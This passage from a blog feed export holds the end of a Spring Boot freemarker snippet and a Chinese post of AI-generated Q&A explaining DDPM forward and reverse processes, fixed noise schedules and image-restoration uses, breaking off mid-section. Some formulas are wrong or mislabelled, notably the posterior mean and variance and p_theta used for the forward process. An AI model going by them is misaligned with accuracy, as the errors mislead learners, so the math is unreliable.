<h3 id="freemarker"><a href="#freemarker" class="headerlink" title="freemarker"></a>freemarker</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>…</p>
]]></content>
      <tags>
        <tag>spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>diffusion model</title>
    <url>/2025/03/26/diffusion-model/</url>
    <content><![CDATA[<h2 id="diffusion-model"><a href="#diffusion-model" class="headerlink" title="diffusion model"></a>diffusion model</h2><p><a href="https://zhuanlan.zhihu.com/p/624221952">zhihu</a></p>
<h2 id="ask-to-ai"><a href="#ask-to-ai" class="headerlink" title="ask to ai"></a>ask to ai</h2><h2 id="扩散模型如ddpm的前向过程"><a href="#扩散模型如ddpm的前向过程" class="headerlink" title="扩散模型如ddpm的前向过程"></a>扩散模型如ddpm的前向过程</h2><p>好的，我将详细解释<strong>扩散模型（如DDPM）中的前向过程</strong>，并重点分析其数学公式和步骤。</p>
<hr>
<h3 id="扩散模型的前向过程（Forward-Process）"><a href="#扩散模型的前向过程（Forward-Process）" class="headerlink" title="扩散模型的前向过程（Forward Process）"></a><strong>扩散模型的前向过程（Forward Process）</strong></h3><p>扩散模型的核心思想是通过一个马尔可夫链将真实数据 (x_0) 逐步添加噪声，最终转化为纯噪声 (x_T)。这一过程称为<strong>前向过程</strong>（Forward Process），其数学形式如下：</p>
<hr>
<h4 id="1-前向过程的数学定义"><a href="#1-前向过程的数学定义" class="headerlink" title="1. 前向过程的数学定义"></a><strong>1. 前向过程的数学定义</strong></h4><p>假设数据 (x_0) 是 (d)-维向量（如图像的像素值），前向过程通过 (T) 个时间步（如 (T&#x3D;1000)）逐步添加噪声。每个时间步 (t) 的状态 (x_t) 由前一个状态 (x_{t-1}) 生成，满足：<br>[<br>x_t &#x3D; \sqrt{\alpha_t} \cdot x_{t-1} + \sqrt{1 - \alpha_t} \cdot \epsilon_{t}<br>]<br>其中：</p>
<ul>
<li>(\alpha_t \in (0,1)) 是方差衰减系数（variance decay schedule），通常预先定义。</li>
<li>(\epsilon_t \sim \mathcal{N}(0, I)) 是独立的高斯噪声。</li>
<li>(\sqrt{\alpha_t}) 是缩放因子，控制保留原始数据的幅度。</li>
<li>(\sqrt{1 - \alpha_t}) 是噪声的幅度。</li>
</ul>
<hr>
<h4 id="2-核心参数：方差衰减系数-alpha-t"><a href="#2-核心参数：方差衰减系数-alpha-t" class="headerlink" title="2. 核心参数：方差衰减系数 (\alpha_t)"></a><strong>2. 核心参数：方差衰减系数 (\alpha_t)</strong></h4><p>参数 (\alpha_t) 的选择决定了噪声添加的速度。常见的设计包括：</p>
<ul>
<li><strong>线性衰减</strong>：(\alpha_t &#x3D; 1 - \beta_t)，其中 (\beta_t) 是一个随时间递增的小值（如从 (10^{-4}) 到 (0.02)）。</li>
<li><strong>累积方差</strong>：定义 (\bar{\alpha}<em>t &#x3D; \prod</em>{s&#x3D;1}^t \alpha_s)，则：<br>[<br>x_t &#x3D; \sqrt{\bar{\alpha}_t} \cdot x_0 + \sqrt{1 - \bar{\alpha}_t} \cdot \epsilon_t^{(cum)}<br>]<br>其中 (\epsilon_t^{(cum)}) 是累积噪声。</li>
</ul>
<hr>
<h4 id="3-前向过程的分布推导"><a href="#3-前向过程的分布推导" class="headerlink" title="3. 前向过程的分布推导"></a><strong>3. 前向过程的分布推导</strong></h4><p>前向过程是一个马尔可夫链，每一步的条件分布为：<br>[<br>p_\theta(x_t | x_{t-1}) &#x3D; \mathcal{N}\left(x_t; \sqrt{\alpha_t} x_{t-1}, (1 - \alpha_t) I\right)<br>]<br>通过链式法则，可以推导出 (x_t) 的边缘分布（即从 (x_0) 到 (x_t) 的累积分布）：<br>[<br>p_\theta(x_t | x_0) &#x3D; \mathcal{N}\left(x_t; \sqrt{\bar{\alpha}_t} x_0, (1 - \bar{\alpha}<em>t) I\right)<br>]<br>当 (t &#x3D; T) 时，(x_T) 接近纯噪声分布：<br>[<br>p</em>\theta(x_T | x_0) &#x3D; \mathcal{N}(x_T; 0, I)<br>]</p>
<hr>
<h4 id="4-前向过程的步骤"><a href="#4-前向过程的步骤" class="headerlink" title="4. 前向过程的步骤"></a><strong>4. 前向过程的步骤</strong></h4><p>以下是前向过程的具体步骤：</p>
<h5 id="步骤1：初始化参数"><a href="#步骤1：初始化参数" class="headerlink" title="步骤1：初始化参数"></a><strong>步骤1：初始化参数</strong></h5><ul>
<li>定义时间步数 (T)（如 (T&#x3D;1000)）。</li>
<li>定义方差衰减系数 ({\alpha_t}_{t&#x3D;1}^T) 或其对应的噪声系数 ({\beta_t})。</li>
<li>预计算累积系数 (\bar{\alpha}<em>t &#x3D; \prod</em>{s&#x3D;1}^t \alpha_s)。</li>
</ul>
<h5 id="步骤2：前向扩散"><a href="#步骤2：前向扩散" class="headerlink" title="步骤2：前向扩散"></a><strong>步骤2：前向扩散</strong></h5><p>从初始数据 (x_0) 开始，逐步添加噪声：</p>
<ol>
<li><strong>时间步 (t&#x3D;1)</strong>：<br>[<br>x_1 &#x3D; \sqrt{\alpha_1} x_0 + \sqrt{1 - \alpha_1} \cdot \epsilon_1<br>]</li>
<li><strong>时间步 (t&#x3D;2)</strong>：<br>[<br>x_2 &#x3D; \sqrt{\alpha_2} x_1 + \sqrt{1 - \alpha_2} \cdot \epsilon_2<br>]</li>
<li><strong>…</strong></li>
<li><strong>时间步 (t&#x3D;T)</strong>：<br>[<br>x_T &#x3D; \sqrt{\alpha_T} x_{T-1} + \sqrt{1 - \alpha_T} \cdot \epsilon_T<br>]</li>
</ol>
<h5 id="步骤3：终止条件"><a href="#步骤3：终止条件" class="headerlink" title="步骤3：终止条件"></a><strong>步骤3：终止条件</strong></h5><p>当 (t&#x3D;T) 时，(x_T) 接近标准高斯分布 (\mathcal{N}(0, I))，此时数据已完全被噪声覆盖。</p>
<hr>
<h4 id="5-关键性质"><a href="#5-关键性质" class="headerlink" title="5. 关键性质"></a><strong>5. 关键性质</strong></h4><ol>
<li><strong>马尔可夫性</strong>：每个 (x_t) 仅依赖于 (x_{t-1})，符合马尔可夫链的定义。</li>
<li><strong>可逆性</strong>：前向过程是可逆的，反向过程（生成模型）通过学习从 (x_T) 逐步去噪恢复 (x_0)。</li>
<li><strong>噪声累积</strong>：通过累积方差 (\bar{\alpha}_t)，最终 (x_T) 的分布与初始数据 (x_0) 无关。</li>
</ol>
<hr>
<h4 id="6-示例：DDPM中的参数设置"><a href="#6-示例：DDPM中的参数设置" class="headerlink" title="6. 示例：DDPM中的参数设置"></a><strong>6. 示例：DDPM中的参数设置</strong></h4><p>在DDPM（Denoising Diffusion Probabilistic Models）中，常见的参数设置如下：</p>
<ul>
<li><strong>噪声系数 (\beta_t)</strong>：通常线性递增：<br>[<br>\beta_t &#x3D; \beta_{\text{min}} + \frac{t-1}{T-1} (\beta_{\text{max}} - \beta_{\text{min}})<br>]<br>其中 (\beta_{\text{min}} &#x3D; 0.0001), (\beta_{\text{max}} &#x3D; 0.02)。</li>
<li><strong>(\alpha_t &#x3D; 1 - \beta_t)</strong>，(\bar{\alpha}<em>t &#x3D; \prod</em>{s&#x3D;1}^t \alpha_s)。</li>
</ul>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>扩散模型的前向过程通过逐步添加噪声，将真实数据 (x_0) 转化为纯噪声 (x_T)，其核心是马尔可夫链的噪声扩散机制。关键公式包括：<br>[<br>x_t &#x3D; \sqrt{\alpha_t} x_{t-1} + \sqrt{1 - \alpha_t} \epsilon_t<br>]<br>[<br>p_\theta(x_t | x_{t-1}) &#x3D; \mathcal{N}\left(x_t; \sqrt{\alpha_t} x_{t-1}, (1-\alpha_t)I\right)<br>]<br>这一过程为反向生成模型提供了基础，通过学习反向去噪过程来生成数据。</p>
<p>如果需要更深入的数学推导或具体实现细节，可以进一步探讨！</p>
<h2 id="为什么方差一般是固定设置的"><a href="#为什么方差一般是固定设置的" class="headerlink" title="为什么方差一般是固定设置的"></a>为什么方差一般是固定设置的</h2><p>在扩散模型（如DDPM）中，前向过程的方差参数（如(\beta_t)或(\alpha_t)）通常采用<strong>固定预设的衰减路径</strong>，而非通过模型学习动态调整。这种设计有以下关键原因：</p>
<hr>
<h3 id="1-稳定性与可逆性"><a href="#1-稳定性与可逆性" class="headerlink" title="1. 稳定性与可逆性"></a><strong>1. 稳定性与可逆性</strong></h3><p>扩散模型的生成过程需要<strong>可逆性</strong>：从噪声(x_T)逐步恢复到真实数据(x_0)。前向过程的方差路径必须<strong>严格确定</strong>，才能保证反向过程（生成模型）能够准确推断每一步的噪声(\epsilon_t)。如果方差动态变化，可能导致以下问题：</p>
<ul>
<li><strong>反向过程难以建模</strong>：反向过程需要根据固定路径的噪声分布来设计去噪步骤，若方差动态调整，反向过程的数学推导和训练会变得复杂。</li>
<li><strong>噪声分布不一致</strong>：动态方差可能导致每一步的噪声分布不可预测，破坏反向过程的稳定性。</li>
</ul>
<hr>
<h3 id="2-理论基础与数学推导"><a href="#2-理论基础与数学推导" class="headerlink" title="2. 理论基础与数学推导"></a><strong>2. 理论基础与数学推导</strong></h3><p>扩散模型的数学推导依赖于<strong>固定方差路径</strong>，例如：</p>
<ul>
<li><strong>累积方差的闭合形式</strong>：通过固定(\beta_t)，可以推导出(x_t)的边缘分布：<br>[<br>p_\theta(x_t|x_0) &#x3D; \mathcal{N}\left(x_t; \sqrt{\bar{\alpha}_t}x_0, (1-\bar{\alpha}_t)I\right)<br>]<br>其中(\bar{\alpha}<em>t &#x3D; \prod</em>{s&#x3D;1}^t \alpha_s)，只有在固定(\alpha_t)时才能保证这一分布的确定性。</li>
<li><strong>反向过程的解析解</strong>：生成模型（如DDPM的去噪网络）需要根据固定路径的噪声分布设计反向步骤，例如：<br>[<br>p_\theta(x_{t-1}|x_t,x_0) &#x3D; \mathcal{N}\left(x_{t-1}; \frac{\sqrt{\alpha_t}}{\sqrt{1-\bar{\alpha}_t}}(x_t - \sqrt{1 - \alpha_t}\epsilon_t), I\right)<br>]<br>若方差动态变化，这一公式将难以推导。</li>
</ul>
<hr>
<h3 id="3-计算效率与简化训练"><a href="#3-计算效率与简化训练" class="headerlink" title="3. 计算效率与简化训练"></a><strong>3. 计算效率与简化训练</strong></h3><ul>
<li><strong>无需学习额外参数</strong>：固定方差路径减少了模型需要学习的参数量，避免了引入复杂的学习机制（如可学习的(\beta_t)），从而降低了训练难度和计算成本。</li>
<li><strong>标准化训练流程</strong>：固定路径使得不同实验和模型之间的对比更加公平，因为方差路径是统一的基准。</li>
</ul>
<hr>
<h3 id="4-经验效果与实验验证"><a href="#4-经验效果与实验验证" class="headerlink" title="4. 经验效果与实验验证"></a><strong>4. 经验效果与实验验证</strong></h3><ul>
<li><strong>经典模型的实践选择</strong>：DDPM、Score-Based Models等经典扩散模型均采用固定方差路径（如线性递增的(\beta_t)），实验表明这种设计在图像生成、文本生成等任务中表现优异。</li>
<li><strong>动态调整的挑战</strong>：尝试动态调整方差（如通过网络预测(\beta_t)）可能引入额外的不稳定性，且未显著提升性能，反而增加计算复杂度。</li>
</ul>
<hr>
<h3 id="5-固定方差的具体设计"><a href="#5-固定方差的具体设计" class="headerlink" title="5. 固定方差的具体设计"></a><strong>5. 固定方差的具体设计</strong></h3><p>常见的固定方差路径设计包括：</p>
<h4 id="线性递增的-beta-t-（DDPM默认设置）"><a href="#线性递增的-beta-t-（DDPM默认设置）" class="headerlink" title="线性递增的(\beta_t)（DDPM默认设置）"></a><strong>线性递增的(\beta_t)</strong>（DDPM默认设置）</h4><p>[<br>\beta_t &#x3D; \beta_{\text{min}} + \frac{t-1}{T-1} (\beta_{\text{max}} - \beta_{\text{min}})<br>]</p>
<ul>
<li><strong>参数示例</strong>：(\beta_{\text{min}} &#x3D; 10^{-4})，(\beta_{\text{max}} &#x3D; 0.02)，(T&#x3D;1000)。</li>
<li><strong>优势</strong>：简单且有效，逐步增加噪声的方差，确保在(T)步后(x_T \approx \mathcal{N}(0,I))。</li>
</ul>
<h4 id="余弦衰减或其他预设函数"><a href="#余弦衰减或其他预设函数" class="headerlink" title="余弦衰减或其他预设函数"></a><strong>余弦衰减或其他预设函数</strong></h4><p>某些变体（如Improved DDPM）采用更复杂的函数设计(\beta_t)，但仍属于<strong>预设路径</strong>，而非动态学习。</p>
<hr>
<h3 id="例外情况：动态调整方差的尝试"><a href="#例外情况：动态调整方差的尝试" class="headerlink" title="例外情况：动态调整方差的尝试"></a><strong>例外情况：动态调整方差的尝试</strong></h3><p>尽管主流模型采用固定路径，但一些研究尝试动态调整方差以优化性能：</p>
<ol>
<li><strong>自适应方差</strong>：通过网络预测每一步的噪声方差（如VDM模型）。</li>
<li><strong>动态时间步选择</strong>：在推理阶段动态选择时间步（如DDIM）。<br>但这些方法通常需要额外的计算开销或复杂的设计，且固定路径的简单性仍被广泛采用。</li>
</ol>
<hr>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>固定方差路径的设计是扩散模型的核心基础，其优势在于：</p>
<ul>
<li><strong>数学上的可逆性</strong>：确保反向过程的理论推导和实现。</li>
<li><strong>训练稳定性</strong>：避免动态调整带来的复杂性和不稳定性。</li>
<li><strong>计算效率</strong>：简化模型结构，减少训练成本。</li>
</ul>
<p>因此，尽管存在动态调整方差的探索，但固定路径仍是扩散模型的<strong>默认选择</strong>，尤其在需要高可靠性和可解释性的场景中。</p>
<h2 id="既然都是固定预设的，那么前后向传播又有什么意义呢"><a href="#既然都是固定预设的，那么前后向传播又有什么意义呢" class="headerlink" title="既然都是固定预设的，那么前后向传播又有什么意义呢"></a>既然都是固定预设的，那么前后向传播又有什么意义呢</h2><p>在扩散模型（如DDPM）中，<strong>前向过程的方差参数是固定预设的</strong>，而<strong>后向过程（生成模型）需要通过学习来逆向这一过程</strong>。虽然前向过程的参数是固定的，但前后向过程的协同作用是扩散模型的核心，其意义在于：</p>
<hr>
<h3 id="1-前向过程的意义"><a href="#1-前向过程的意义" class="headerlink" title="1. 前向过程的意义"></a><strong>1. 前向过程的意义</strong></h3><p>前向过程通过<strong>固定预设的噪声添加路径</strong>，为生成模型提供了一个<strong>确定的噪声扩散框架</strong>。其关键作用包括：</p>
<ul>
<li><strong>定义噪声扩散的数学结构</strong>：通过固定的方差参数（如(\beta_t)），前向过程确保了从(x_0)到(x_T)的噪声添加路径是可逆的，为反向过程提供了数学基础。</li>
<li><strong>简化反向过程的建模</strong>：由于前向过程的参数是固定的，反向过程（生成模型）可以基于这些已知的噪声分布设计去噪步骤，无需动态调整噪声参数。</li>
<li><strong>统一训练和生成流程</strong>：固定路径使得训练和推理阶段的噪声添加过程一致，避免了动态调整参数带来的不确定性。</li>
</ul>
<hr>
<h3 id="2-后向过程的意义"><a href="#2-后向过程的意义" class="headerlink" title="2. 后向过程的意义"></a><strong>2. 后向过程的意义</strong></h3><p>后向过程（生成模型）通过<strong>学习去噪函数</strong>，实现从噪声(x_T)逐步恢复到真实数据(x_0)。其关键作用包括：</p>
<ul>
<li><strong>学习数据分布</strong>：通过最大化似然或最小化噪声损失，模型学习到如何根据当前噪声数据(x_t)和时间步(t)，预测原始数据(x_{t-1})或噪声(\epsilon_t)。</li>
<li><strong>逆向前向过程</strong>：虽然前向过程的参数是固定的，但后向过程需要根据这些参数设计逆向步骤。例如，在DDPM中，生成模型需要根据固定路径的(\beta_t)计算去噪权重：<br>[<br>\mathbb{E}[x_{t-1}|x_t] &#x3D; \frac{1}{\sqrt{\alpha_t}} \left( x_t - \frac{\beta_t}{\sqrt{1 - \bar{\alpha}<em>t}} \cdot \epsilon</em>\theta(x_t, t) \right)<br>]<br>其中，(\epsilon_\theta)是模型预测的噪声，而(\alpha_t, \beta_t)是前向过程的固定参数。</li>
<li><strong>适应数据分布</strong>：虽然前向过程的参数固定，但生成模型通过可学习的参数（如神经网络权重）来捕捉数据分布的复杂性，从而生成高质量样本。</li>
</ul>
<hr>
<h3 id="3-两者的协同作用"><a href="#3-两者的协同作用" class="headerlink" title="3. 两者的协同作用"></a><strong>3. 两者的协同作用</strong></h3><p>前向和后向过程的结合实现了以下核心目标：</p>
<h4 id="1-数学可逆性"><a href="#1-数学可逆性" class="headerlink" title="(1) 数学可逆性"></a><strong>(1) 数学可逆性</strong></h4><ul>
<li><strong>前向过程的固定性</strong>确保了从(x_0)到(x_T)的噪声扩散路径是已知的，从而可以推导出反向过程的数学公式。</li>
<li><strong>反向过程的可学习性</strong>允许模型根据数据分布调整去噪策略，例如通过神经网络学习不同时间步的去噪权重。</li>
</ul>
<h4 id="2-训练与生成的分离"><a href="#2-训练与生成的分离" class="headerlink" title="(2) 训练与生成的分离"></a><strong>(2) 训练与生成的分离</strong></h4><ul>
<li><strong>前向过程作为训练框架</strong>：在训练阶段，模型通过前向过程生成不同时间步的噪声样本(x_t)，并学习如何从(x_t)预测噪声(\epsilon_t)（或(x_{t-1})）。</li>
<li><strong>后向过程作为生成框架</strong>：在推理阶段，模型利用训练好的参数，沿着固定的前向路径反向逐步去噪，最终生成样本。</li>
</ul>
<h4 id="3-稳定性与效率"><a href="#3-稳定性与效率" class="headerlink" title="(3) 稳定性与效率"></a><strong>(3) 稳定性与效率</strong></h4><ul>
<li><strong>固定前向路径避免了动态调整的不稳定性</strong>：如果前向过程的参数动态变化，反向过程可能因噪声分布的不确定性而难以收敛。</li>
<li><strong>后向模型的灵活性</strong>：通过学习，模型可以适应不同数据集的特性，例如图像、音频或文本的分布差异。</li>
</ul>
<hr>
<h3 id="4-具体示例：DDPM的训练与生成"><a href="#4-具体示例：DDPM的训练与生成" class="headerlink" title="4. 具体示例：DDPM的训练与生成"></a><strong>4. 具体示例：DDPM的训练与生成</strong></h3><h4 id="1-训练阶段"><a href="#1-训练阶段" class="headerlink" title="(1) 训练阶段"></a><strong>(1) 训练阶段</strong></h4><ul>
<li><strong>前向过程</strong>：对于每个真实数据(x_0)，随机选择时间步(t)，生成噪声样本(x_t)：<br>[<br>x_t &#x3D; \sqrt{\bar{\alpha}_t} x_0 + \sqrt{1 - \bar{\alpha}_t} \cdot \epsilon<br>]<br>其中(\epsilon \sim \mathcal{N}(0, I))，(\bar{\alpha}_t)是固定参数。</li>
<li><strong>后向模型（去噪网络）</strong>：模型( \epsilon_\theta(x_t, t) )被训练以预测噪声(\epsilon)，损失函数为：<br>[<br>\mathbb{E}<em>{t,x_0,\epsilon} \left[ || \epsilon - \epsilon</em>\theta(x_t, t) ||^2 \right]<br>]</li>
</ul>
<h4 id="2-生成阶段"><a href="#2-生成阶段" class="headerlink" title="(2) 生成阶段"></a><strong>(2) 生成阶段</strong></h4><ul>
<li><strong>反向过程</strong>：从纯噪声(x_T \sim \mathcal{N}(0, I))开始，逐步去噪：<br>[<br>x_{t-1} &#x3D; \frac{1}{\sqrt{\alpha_t}} \left( x_t - \frac{\beta_t}{\sqrt{1 - \bar{\alpha}<em>t}} \cdot \epsilon</em>\theta(x_t, t) \right) + \sqrt{\beta_t} \cdot \epsilon<br>]<br>其中，(\alpha_t, \beta_t)是固定的前向参数，而(\epsilon_\theta)是训练好的模型。</li>
</ul>
<hr>
<h3 id="5-如果前向过程的参数不固定会怎样？"><a href="#5-如果前向过程的参数不固定会怎样？" class="headerlink" title="5. 如果前向过程的参数不固定会怎样？"></a><strong>5. 如果前向过程的参数不固定会怎样？</strong></h3><p>如果前向过程的方差参数(\beta_t)是动态可学习的，可能会导致以下问题：</p>
<ul>
<li><strong>反向过程的不可逆性</strong>：动态参数会破坏噪声扩散的确定性路径，使得反向过程无法推导出闭合解。</li>
<li><strong>训练不稳定</strong>：模型需要同时学习前向和后向参数，增加了优化难度。</li>
<li><strong>计算复杂度上升</strong>：动态参数需要额外的网络结构和训练资源。</li>
</ul>
<p>因此，<strong>固定前向参数的设计是扩散模型高效训练和稳定生成的关键</strong>。</p>
<hr>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><strong>前向过程的意义</strong>：提供一个确定的噪声扩散路径，确保反向过程的数学可逆性。</li>
<li><strong>后向过程的意义</strong>：通过学习去噪函数，适应数据分布并逆向前向过程，最终生成高质量样本。</li>
<li><strong>两者的协同</strong>：固定前向参数与可学习的后向模型结合，既保证了理论上的可逆性，又实现了数据分布的灵活建模。</li>
</ul>
<p>这种设计使得扩散模型在图像生成、文本生成等任务中表现出色，同时保持了数学上的简洁性和训练效率。</p>
<h2 id="可以理解为前后向的协同主要是为了训练出一个具有泛化能力的去噪模型-以达到生成更加高质量的样本吗"><a href="#可以理解为前后向的协同主要是为了训练出一个具有泛化能力的去噪模型-以达到生成更加高质量的样本吗" class="headerlink" title="可以理解为前后向的协同主要是为了训练出一个具有泛化能力的去噪模型 以达到生成更加高质量的样本吗"></a>可以理解为前后向的协同主要是为了训练出一个具有泛化能力的去噪模型 以达到生成更加高质量的样本吗</h2><p>是的，你的理解是正确的！<strong>前向过程与后向过程的协同作用本质上是为了训练一个具有泛化能力的去噪模型，从而生成高质量的样本</strong>。以下是更详细的解释：</p>
<hr>
<h3 id="1-泛化能力的来源"><a href="#1-泛化能力的来源" class="headerlink" title="1. 泛化能力的来源"></a><strong>1. 泛化能力的来源</strong></h3><p>前向过程通过<strong>固定噪声添加路径</strong>，为模型提供了<strong>多样化的噪声样本</strong>，迫使模型在训练时学习如何在<strong>不同噪声水平下</strong>去噪，从而具备泛化能力：</p>
<ul>
<li><strong>多噪声级别的学习</strong>：在训练阶段，模型会接触到从完全干净数据（(x_0)）到纯噪声（(x_T)）的<strong>所有中间噪声状态</strong>（(x_1, x_2, \dots, x_{T-1})）。这使得模型能够学习在不同噪声强度下的去噪策略，而不仅仅是处理某一特定噪声水平。</li>
<li><strong>鲁棒性提升</strong>：模型需要适应从轻微噪声到极端噪声的去噪任务，从而具备更强的鲁棒性，避免在生成过程中因噪声分布变化而失效。</li>
</ul>
<hr>
<h3 id="2-高质量生成的保障"><a href="#2-高质量生成的保障" class="headerlink" title="2. 高质量生成的保障"></a><strong>2. 高质量生成的保障</strong></h3><p>后向过程（生成模型）通过学习去噪函数，逐步将噪声数据恢复为真实数据，其核心优势包括：</p>
<ul>
<li><strong>渐进式细化</strong>：生成过程从纯噪声(x_T)开始，通过(T)个步骤逐步去噪，每一步都细化生成结果。这种<strong>渐进式生成</strong>避免了直接从噪声一步生成高质量样本的困难，类似于“逐步解谜”。</li>
<li><strong>数学可逆性</strong>：前向过程的固定参数确保了反向步骤的数学公式（如去噪权重）的正确性，使得生成过程能够<strong>精确控制每一步的去噪幅度</strong>，避免过冲或欠修正。</li>
<li><strong>数据分布的精确建模</strong>：模型通过最小化噪声预测误差（如(L_2)损失），学习到数据分布的统计特性。例如，在图像生成中，模型会学习如何在噪声中保留边缘、纹理等关键特征。</li>
</ul>
<hr>
<h3 id="3-协同设计的细节"><a href="#3-协同设计的细节" class="headerlink" title="3. 协同设计的细节"></a><strong>3. 协同设计的细节</strong></h3><h4 id="1-前向过程的“噪声多样性”"><a href="#1-前向过程的“噪声多样性”" class="headerlink" title="(1) 前向过程的“噪声多样性”"></a><strong>(1) 前向过程的“噪声多样性”</strong></h4><ul>
<li><strong>训练数据增强</strong>：前向过程通过固定路径生成不同噪声水平的样本（如(x_1, x_2, \dots, x_T)），相当于为模型提供了<strong>增强数据</strong>，帮助模型学习噪声与真实数据之间的映射关系。</li>
<li><strong>覆盖边缘案例</strong>：即使真实数据分布中某些区域样本稀少，模型也能通过噪声样本（如高噪声状态）学习到这些区域的潜在结构。</li>
</ul>
<h4 id="2-后向过程的“去噪泛化”"><a href="#2-后向过程的“去噪泛化”" class="headerlink" title="(2) 后向过程的“去噪泛化”"></a><strong>(2) 后向过程的“去噪泛化”</strong></h4><ul>
<li><strong>时间步的条件依赖</strong>：模型被训练为根据当前时间步(t)和噪声数据(x_t)预测噪声(\epsilon_t)，从而<strong>显式地建模时间步的影响</strong>。例如，在早期步骤（如(t&#x3D;1000)），模型可能专注于去除高斯噪声；在后期步骤（如(t&#x3D;1)），则需要微调细节（如边缘锐度）。</li>
<li><strong>噪声分布的适应性</strong>：通过固定前向路径，模型可以<strong>统一建模所有噪声分布</strong>，而无需为每个噪声级别单独设计模型。</li>
</ul>
<hr>
<h3 id="4-对比传统生成模型"><a href="#4-对比传统生成模型" class="headerlink" title="4. 对比传统生成模型"></a><strong>4. 对比传统生成模型</strong></h3><h4 id="与GAN的对比"><a href="#与GAN的对比" class="headerlink" title="与GAN的对比"></a><strong>与GAN的对比</strong></h4><ul>
<li><strong>GAN的挑战</strong>：GAN通过对抗训练生成样本，但容易出现模式崩溃（mode collapse）或训练不稳定。</li>
<li><strong>扩散模型的优势</strong>：通过前向过程的固定噪声路径和后向过程的渐进式去噪，扩散模型能够<strong>稳定地建模数据分布的复杂性</strong>，减少生成样本的多样性损失。</li>
</ul>
<h4 id="与VAE的对比"><a href="#与VAE的对比" class="headerlink" title="与VAE的对比"></a><strong>与VAE的对比</strong></h4><ul>
<li><strong>VAE的瓶颈</strong>：VAE通过编码器-解码器结构压缩数据，但可能因瓶颈层的信息丢失导致生成质量下降。</li>
<li><strong>扩散模型的改进</strong>：扩散模型通过多步骤去噪，逐步恢复数据细节，避免了一次性解码的局限性，从而生成更高质量的样本。</li>
</ul>
<hr>
<h3 id="5-实际效果验证"><a href="#5-实际效果验证" class="headerlink" title="5. 实际效果验证"></a><strong>5. 实际效果验证</strong></h3><p>在图像生成任务中，扩散模型（如DDPM、Stable Diffusion）的生成质量已达到或超过GAN和VAE：</p>
<ul>
<li><strong>细节保留</strong>：模型在后期时间步（如(t&#x3D;1)）能精细调整颜色、纹理等细节。</li>
<li><strong>多样性</strong>：通过噪声(x_T)的随机性，生成样本具有多样性，同时避免模式重复。</li>
</ul>
<hr>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>前向与后向过程的协同设计，通过以下方式实现了泛化能力与高质量生成：</p>
<ol>
<li><strong>前向过程</strong>：提供固定但多样化的噪声样本，为模型学习不同噪声水平下的去噪策略奠定基础。</li>
<li><strong>后向过程</strong>：通过学习去噪函数，逐步恢复数据，结合数学可逆性确保生成的稳定性。</li>
<li><strong>协同结果</strong>：模型在训练中学习到泛化能力，生成时通过渐进式去噪，逐步细化结果，最终输出高质量样本。</li>
</ol>
<p>这种设计不仅解决了传统生成模型的局限性，还通过数学上的可逆性和工程上的高效性，成为当前生成任务的主流方法之一。</p>
<h2 id="训练完成后这个训练后的模型是可以直接拿来对某些图片进行清晰化等操作吗"><a href="#训练完成后这个训练后的模型是可以直接拿来对某些图片进行清晰化等操作吗" class="headerlink" title="训练完成后这个训练后的模型是可以直接拿来对某些图片进行清晰化等操作吗"></a>训练完成后这个训练后的模型是可以直接拿来对某些图片进行清晰化等操作吗</h2><p>是的，训练后的扩散模型（如DDPM、Stable Diffusion等）<strong>可以用于图像修复、去噪、超分辨率等任务</strong>，但需要根据具体任务调整模型的使用方式。以下是详细分析：</p>
<hr>
<h3 id="1-扩散模型的核心能力"><a href="#1-扩散模型的核心能力" class="headerlink" title="1. 扩散模型的核心能力"></a><strong>1. 扩散模型的核心能力</strong></h3><p>扩散模型的核心是<strong>学习数据分布的渐进式去噪过程</strong>。其训练目标是让模型能够从噪声中恢复符合训练数据分布的样本。这种能力使其在以下任务中具有潜力：</p>
<ul>
<li><strong>图像修复</strong>：修复损坏或缺失的图像区域。</li>
<li><strong>去噪</strong>：从噪声图像中恢复清晰图像。</li>
<li><strong>超分辨率</strong>：将低分辨率图像提升为高分辨率。</li>
<li><strong>风格迁移</strong>：将图像转换为特定风格。</li>
</ul>
<hr>
<h3 id="2-直接使用的可行性"><a href="#2-直接使用的可行性" class="headerlink" title="2. 直接使用的可行性"></a><strong>2. 直接使用的可行性</strong></h3><h4 id="1-可行性基础"><a href="#1-可行性基础" class="headerlink" title="(1) 可行性基础"></a><strong>(1) 可行性基础</strong></h4><p>扩散模型的<strong>去噪能力</strong>使其能够对输入图像进行优化。例如：</p>
<ul>
<li><strong>去噪任务</strong>：将模糊或含噪的图像作为输入，通过扩散模型的反向过程逐步去噪。</li>
<li><strong>修复任务</strong>：将损坏的图像作为输入，通过扩散模型生成修复后的结果。</li>
</ul>
<h4 id="2-限制与注意事项"><a href="#2-限制与注意事项" class="headerlink" title="(2) 限制与注意事项"></a><strong>(2) 限制与注意事项</strong></h4><ul>
<li><strong>数据分布匹配</strong>：模型的训练数据决定了其能力范围。例如：<ul>
<li>如果模型在自然图像上训练，可能无法有效处理医学影像或艺术风格图像。</li>
<li>如果训练数据中没有包含特定类型的损坏（如镜头模糊），模型可能无法有效修复该类型。</li>
</ul>
</li>
<li><strong>任务适配性</strong>：扩散模型的原始设计是<strong>生成新样本</strong>，而非直接处理现有图像。因此，直接应用可能需要以下调整：<ul>
<li><strong>引导采样（Guided Sampling）</strong>：将输入图像作为条件，引导扩散过程向目标方向优化。</li>
<li><strong>微调（Fine-tuning）</strong>：针对特定任务（如去噪）调整模型参数。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-具体应用方法"><a href="#3-具体应用方法" class="headerlink" title="3. 具体应用方法"></a><strong>3. 具体应用方法</strong></h3><p>以下是扩散模型在图像处理任务中的典型用法：</p>
